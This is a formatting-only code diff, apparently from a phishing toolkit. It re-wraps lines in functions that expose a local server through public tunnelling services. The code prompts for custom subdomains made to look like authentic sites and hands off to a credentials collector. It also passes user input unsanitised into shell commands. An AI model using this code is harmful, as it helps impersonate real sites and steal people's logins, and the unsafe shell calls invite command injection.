@@ -302,7 +302,8 @@ def start_serveo(port):
             #  !! \n''')
             print(localization.lang_start_serveo["failed_to_get_domain"])
             print(localization.lang_start_serveo["suggestion_to_fix_issue"])
-            print(localization.lang_start_serveo["you_can_try_to_select_other_domain"])
+            print(
+                localization.lang_start_serveo["you_can_try_to_select_other_domain"])
             wait(4)
             run_command('clear')
             return custom(port)
@@ -387,11 +388,14 @@ def start_localxpose(port):
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for Localxpose(Ex: mysubdomain)'''.format(
             default_palette[0], default_palette[2]))
-        lnk = input("\n{0}CUSTOM Subdomain>>> {1}".format(default_palette[0], default_palette[2]))
-        run_command('./Server/loclx tunnel http --to :%s --subdomain %s > link.url 2> /dev/null &' % (port, lnk))
+        lnk = input("\n{0}CUSTOM Subdomain>>> {1}".format(
+            default_palette[0], default_palette[2]))
+        run_command(
+            './Server/loclx tunnel http --to :%s --subdomain %s > link.url 2> /dev/null &' % (port, lnk))
         wait(7)
         try:
-            output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
+            output = check_output(
+                "grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
             url = output.decode("utf-8")
             run_command('clear')
             print('''
@@ -427,7 +431,8 @@ def start_localxpose(port):
     print(
         "\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(
             default_palette[0], default_palette[2]))
-    choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(default_palette[0], default_palette[2]))
+    choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(
+        default_palette[0], default_palette[2]))
     run_command('clear')
     if choice == '1':
 
@@ -453,7 +458,8 @@ def start_localtunnel(port, npm):
                                                                                     default_palette[2]))
     print("\n{0}[{1}+{0}]{1}Type Subdomain for Custom URL. \n{0}[{1}+{0}]{1}Leave Empty For Random URL".format(
         default_palette[0], default_palette[2]))
-    s = input('\n{0}(Localtunnel/Subdomain)> {1}'.format(default_palette[0], default_palette[2]))
+    s = input(
+        '\n{0}(Localtunnel/Subdomain)> {1}'.format(default_palette[0], default_palette[2]))
     try:
         run_command('{0}lt -p '.format('' if npm else 'Server/') +
                     port + ((' -s ' + s) if s != '' else s) + ' > link.url &')
@@ -491,7 +497,8 @@ def start_openport(port):
         run_command('openport -K && openport %s > output.txt &' % (port))
         print('{0}[{1}*{0}] {1}Openport Server Running in Background.. Please wait.'.format(default_palette[0],
                                                                                             default_palette[4]))
-        wait(20)  # Sleep time is important as the openport command takes some time to give response link.
+        # Sleep time is important as the openport command takes some time to give response link.
+        wait(20)
         run_command(
             'cat output.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u | grep -v https://openport.io/user > openport.txt')  # Taking out the neccesary verification link from output txt file of openport (above).
         print('{0}[{1}*{0}] {1}Working To Get OpenPort Tunnel Activation Link...'.format(default_palette[0],
@@ -499,13 +506,15 @@ def start_openport(port):
         with open('openport.txt') as f:
             read_data = f.read()
             if 'openport.io/l/' in read_data:
-                print('{0}[{1}*{0}] {1}Got Activation Link...'.format(default_palette[0], default_palette[4]))
+                print(
+                    '{0}[{1}*{0}] {1}Got Activation Link...'.format(default_palette[0], default_palette[4]))
             else:
                 print('{0}[{1}^{0}] {1}Failed To Get Openport Activation Link... '.format(default_palette[0],
                                                                                           default_palette[4]))
                 output = open('output.txt', 'r')
                 output = output.read()
-                print('{0}[{1}!{0}] {1}Openport Error:\n\n{2}'.format(default_palette[0], default_palette[4], output))
+                print('{0}[{1}!{0}] {1}Openport Error:\n\n{2}'.format(
+                    default_palette[0], default_palette[4], output))
                 input('\n\n{0}[{1}*{0}] {1}Try Other Tunnels... (Press Enter)'.format(default_palette[0],
                                                                                       default_palette[4]))
                 server_selection(port)
@@ -587,7 +596,8 @@ def start_pagekite(port):
                 default_palette[0], default_palette[4]))
             input("\n{0}[{1}*{0}] {0}Press Enter To Launch The Pagekite...{1}".format(default_palette[0],
                                                                                       default_palette[4]))
-            run_command('python2 Server/pagekite.py --clean --signup {0} {1}.pagekite.me'.format(port, subdomain))
+            run_command(
+                'python2 Server/pagekite.py --clean --signup {0} {1}.pagekite.me'.format(port, subdomain))
         except KeyboardInterrupt:
             print('[!] Please Copy the Generated Link For Further Use')
             credentials_collector(port)
